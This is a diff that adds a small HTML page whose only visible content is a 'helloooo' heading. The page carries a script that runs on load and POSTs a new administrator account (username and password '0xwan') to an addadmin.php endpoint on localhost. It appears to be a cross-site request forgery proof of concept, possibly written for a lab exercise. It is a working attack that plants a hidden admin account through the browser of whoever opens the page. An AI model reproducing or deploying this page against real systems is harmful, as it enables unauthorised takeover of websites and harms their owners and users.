@@ -1,1 +1,37 @@
-testttt
+<html>
+  <body>
+    <script>
+    // Create a new XMLHttpRequest object
+var xhr = new XMLHttpRequest();
+
+// Specify the HTTP method (POST) and the URL to send the request to
+xhr.open("POST", "http://localhost/addadmin.php", true);
+
+// Set the request headers (if needed)
+// xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+// Create a FormData object to send data as key-value pairs
+var formData = new FormData();
+formData.append("username", "0xwan");
+formData.append("password", "0xwan");
+
+// Set up an event listener to handle the response
+xhr.onload = function () {
+  if (xhr.status >= 200 && xhr.status < 300) {
+    // Request was successful, handle the response here
+    console.log("Request was successful. Response: " + xhr.responseText);
+  } else {
+    // Request failed
+    console.error("Request failed with status: " + xhr.status);
+  }
+};
+
+// Send the POST request with the FormData as the data
+xhr.send(formData);
+
+  </script>
+    <h1>
+      helloooo
+    </h1>
+  </body>
+</html>
